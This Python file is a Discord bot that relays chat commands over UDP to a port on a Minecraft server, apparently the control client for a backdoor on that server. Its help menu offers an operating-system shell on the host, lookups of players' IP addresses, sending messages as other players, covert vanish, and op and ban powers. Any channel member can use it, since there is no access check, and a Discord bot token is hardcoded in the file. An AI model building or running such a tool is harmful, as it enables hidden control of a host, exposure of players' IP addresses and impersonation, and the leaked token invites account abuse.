import discord
import asyncio
import socket

intents = discord.Intents.default()
intents.message_content = True  # Allow access to message content

client = discord.Client(intents=intents)

# UDP server details
UDP_HOST = 'play.voidsmp.com' # IP of the server
UDP_PORT = 2137

@client.event
async def on_ready():
	 await client.change_presence(activity=discord.Game(name="prefix: ?"))

@client.event
async def on_message(message):
    if message.author == client.user:
        return  # Ignore messages sent by the bot itself

    if message.content.startswith("? "):
        return # Ignore questionmark space

    if message.content.startswith("??"):
        return # Ignore "???"

    if message.content.startswith("?help"):
        await message.channel.send("""
```
?coords      <player>                   - get the coordinates of specified player
?op          <player>                   - op specified player
?deop        <player>                   - deop specified player
?ban         <player> <source> [reason] - ban player with reason and source
?banip       <player> <source> [reason] - ip ban player with reason and source
?exec        <command>                  - execute command as server console [Visible]
?shell       <command>                  - execute operating system command as host
?seed                                   - get the current world seed
?psay, ?sudo <player> <message>         - sends messages as player
?reload                                 - Reloads the server [Very visible]
?getip       <player>                   - gets ip of the player
?vanish      <player> <players>         - hides player from players
?unvanish    <player> <players>         - unhiddes player from players
?tp          <player> <X> <Y> <Z>       - teleport to specified coordinates
?exp         <player> [+-]<0-255>[l]    - give a player xp (bug: subtracting xp doesnt subtract levels)
?unban       <player>                   - unbans player
?kick        <player> <reason>          - kicks player for a reason
?god	     <player>                   - gives player godmode (YOU CAN STILL GET KILLED IF YOU GET ONESHOT)
?deathcoords <player>                   - gets death coords of player
?bedcoords   <player>                   - gets bed coords of player
```
""")
        return

    if message.content.startswith('?'):
        command = message.content[1:]  # Extract the command after the "?"

        # Send command to UDP server
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.sendto(command.encode(), (UDP_HOST, UDP_PORT))
        
        # Receive response from UDP server
        response, _ = udp_socket.recvfrom(1024)
        udp_socket.close()

        response_text = response.decode()

        # Send response back to the same channel
        await message.channel.send(response_text)

# Run the bot
client.run('NTE0MgkgMDU5NgU5MgU4MgYYNg.G5kdNn.gOiUDbQjOE0CJFnbCCAx1jyfbJ0KRCA7aqvhes') # Token
